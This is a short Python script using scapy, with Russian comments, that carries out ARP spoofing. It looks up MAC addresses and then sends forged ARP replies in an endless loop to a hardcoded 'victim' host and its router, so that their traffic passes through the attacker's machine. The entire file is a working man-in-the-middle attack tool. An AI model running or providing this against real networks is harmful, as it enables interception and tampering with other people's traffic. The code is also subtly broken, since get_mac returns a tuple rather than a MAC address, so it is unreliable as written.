import scapy.all as scapy

import time


def get_mac(ip):#Узнаем mac адрес

    arp_request = scapy.ARP(pdst = ip) #Создание ARP пакета с указанием широковещательного ip-адреса

    broadcast = scapy.Ether(dst = 'ff:ff:ff:ff:ff:ff') #Создание фрэйма для отправки ARP пакета. dst = 'ff:ff:ff:ff:ff:ff' <--- широковещательный mac-адрес в сети

    arp_request_broadcast = broadcast/arp_request #Объединяем фрейм и ARP

    #Отправка пакета
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose = False)[0]#Из двух списков answer и unanswer мы выбираем answer и достаем из него mac адрес answered_list[0][1].hwsrc <--- таким способом 

    return answered_list[0][1].hwsrc, print(answered_list[0][1].hwsrc)

def spoof(target_ip, spoof_ip):#Собираем поддельный пакет и отправляем его
    target_mac = get_mac(target_ip) #(input('Введите ip адрес жертвы для получения mac: '))
    packet = scapy.ARP(op = 2, pdst = target_ip, hwdst = target_mac, psrc = spoof_ip)
    scapy.send(packet)#Отправка поддельного пакета

target = '192.168.31.157' #input('Введите ip адрес жертвы (пример: X.X.X.X): ')
router = '192.168.31.1' #input('Введите ip адрес маршрутизатора(роутера) (пример: X.X.X.X): ')

#Зацикливание отправки поддельных пакетов (если этого не делать, то при втором запросе жертвы ARP таблица вернется в прежнее состояние)

while 1:
    spoof('192.168.31.157', '192.168.31.1')
    spoof('192.168.31.1', '192.168.31.157')
    time.sleep(2)#Задержка отправки пакетов 